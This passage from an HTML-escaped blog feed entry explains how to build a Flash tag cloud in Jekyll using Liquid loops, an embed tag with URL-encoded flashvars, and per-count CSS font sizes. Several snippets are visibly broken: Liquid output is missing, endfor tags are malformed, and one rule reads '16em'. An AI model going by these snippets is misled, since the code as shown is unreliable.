&lt;span class='nt'&gt;&amp;lt;a&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;/blog/tag/advertising&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;tag-link-40&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;title=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;20 topics&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;style=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;font-size: 6pt;&amp;#39;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;advertising&lt;span class='nt'&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; 
&lt;span class='nt'&gt;&amp;lt;a&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;/blog/tag/advocacy&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;tag-link-41&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;title=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;25 topics&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;style=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;font-size: 7pt;&amp;#39;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;advocacy&lt;span class='nt'&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; 
&lt;span class='nt'&gt;&amp;lt;a&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;/blog/tag/backpacking&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;tag-link-101&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;title=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;23 topics&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;style=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;font-size: 7pt;&amp;#39;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;backpacking&lt;span class='nt'&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; 
&lt;span class='nt'&gt;&amp;lt;a&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;/blog/tag/blogging&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;tag-link-147&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;title=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;35 topics&amp;#39;&lt;/span&gt; &lt;span class='na'&gt;style=&lt;/span&gt;&lt;span class='s'&gt;&amp;#39;font-size: 9pt;&amp;#39;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;blogging&lt;span class='nt'&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;span class='nt'&gt;&amp;lt;/tags&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The value above needs to Url encoded and assigned to flashvars variable. In order to achieve this in Jekyll, we have two tasks&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Generating list of tags dynamically&lt;/li&gt;

&lt;li&gt;Dynamically resizing the text of each tag based on its cound&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The first task can be simply achieved using standard Liquid Markup which is supported by Jekyll&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;{% for tag in site.categories%}

{ % endfor %}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To achieve the second task, we can augment our first code cleverly as shown below&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;{% for tag in site.categories%}
  {% assign t = tag.first%}
  {% assign posts = tag.last %}
	  &lt;span class='nt'&gt;&amp;lt;a&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tag tag0&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;title=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;0 posts&amp;quot;&lt;/span&gt; &lt;span class='na'&gt;href=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;/categories/.html&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
{ % endfor %}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Note that the above code will generate the list of anchor tags in loop and assign the appropriate Url, title and class attributes. You can modify these as per your convinience. This needs to be encoded before you put in use. You can use this &lt;a href='http://meyerweb.com/eric/tools/dencoder/'&gt;site&lt;/a&gt; to do the encoding.&lt;/p&gt;

&lt;p&gt;Our final Jekyll code looks like this&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='html'&gt;&lt;span class='nt'&gt;&amp;lt;div&lt;/span&gt; &lt;span class='na'&gt;class=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;category&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;
	&lt;span class='nt'&gt;&amp;lt;h4&amp;gt;&lt;/span&gt;Tag Cloud&lt;span class='nt'&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;

&lt;span class='nt'&gt;&amp;lt;div&lt;/span&gt; &lt;span class='na'&gt;id=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;wpcumuluscontent&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;
	&lt;span class='nt'&gt;&amp;lt;embed&lt;/span&gt; 
	&lt;span class='na'&gt;type=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;application/x-shockwave-flash&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;src=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;/files/tagcloud.swf&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;id=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tagcloudflash&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;name=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tagcloudflash&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;bgcolor=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;#474c52&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;quality=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;high&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;wmode=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;transparent&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;allowscriptaccess=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;always&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;flashvars=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;tcolor=0xffffff&amp;amp;amp;tcolor2=0xb6bcc1&amp;amp;amp;hicolor=0xa1ff66&amp;amp;amp;tspeed=100&amp;amp;amp;distr=true&amp;amp;amp;mode=tags&amp;amp;amp;tagcloud=%3Ctags%3E%3C%2Ftags%3E&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;height=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;300&amp;quot;&lt;/span&gt; 
	&lt;span class='na'&gt;width=&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;250&amp;quot;&lt;/span&gt;&lt;span class='nt'&gt;&amp;gt;&lt;/span&gt;
	&lt;span class='nt'&gt;&amp;lt;/embed&amp;gt;&lt;/span&gt;
&lt;span class='nt'&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;span class='nt'&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To make sure that the text is resized according to the number of posts, we add the following CSS in the CSS file&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='css'&gt;&lt;span class='nc'&gt;.tag&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;6pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag1&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;6pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag2&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;6pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag3&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;12pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag4&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;12pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag5&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;12pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag6&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;13pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag7&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;14pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag8&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;15pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag9&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;16em&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag10&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;17pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag11&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;18pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag12&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;19pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag13&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;20pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag14&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;21pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag15&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;22pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag16&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;23pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag17&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;24pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag18&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;25pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag19&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;26pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='nc'&gt;.tag20&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt; &lt;span class='k'&gt;font-size&lt;/span&gt;&lt;span class='o'&gt;:&lt;/span&gt; &lt;span class='m'&gt;27pt&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt; &lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 
</feed>